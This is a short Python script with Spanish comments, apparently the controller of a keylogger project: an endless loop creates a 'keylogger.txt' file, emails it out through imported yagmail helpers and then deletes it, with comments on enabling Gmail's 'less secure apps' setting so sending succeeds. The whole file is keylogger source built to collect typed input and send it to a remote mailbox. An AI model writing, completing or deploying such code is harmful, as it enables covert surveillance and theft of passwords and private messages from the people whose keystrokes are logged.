# OBSERVACIONES
# IMPORTAR LAS LIBRERIAS pynput & yagmail
# https://myaccount.google.com/lesssecureapps = ACTIVAR Acceso de aplicaciones poco seguras
# IMPORTAS LIBRERIAS
from __future__ import print_function
import os
from Enviar import *
from Archivo import *


# obtiene la ruta de la carperta
# ruta = os.getcwd()


def primeraBusqueda():
    #Crea una lista de los documentos del directorio
    archivosSYS = os.listdir()
    seguir = False
    for i in archivosSYS:
        if (i == 'keylogger.txt'):
            print("existe un txt")
            seguir = True
    return seguir



# BUCLE INFINITO
while True:
    # Coloca en una lista todos los archivos
    archivosSYS = os.listdir()
    # VALIDA SI EXISTE UN ARCHIVO TXT
    if (primeraBusqueda() == False):
    # CREA EL ARCHIVO
        try:
            #CREA EL ARCHIVO SI NO NECESITA PERMISOS
            print("Archivo Normal")
            archivoNormal()
        except:
            #SI NECESITA PERMISOS
            print("Archivo permisos")
            ArchivoPermisos()
    else:
        for i in archivosSYS:
            # BUSCA EL ARCHIVO
            if (i == 'keylogger.txt'):
                # ENVIA EL ARCHIVO
                try:
                    enviar(i)
                    print("Correo enviado")
                except:
                    print("REVISA https://myaccount.google.com/lesssecureapps EL CORREO")

                # LO ELIMINAR
                print("ELIMINADO")
                os.unlink(i)

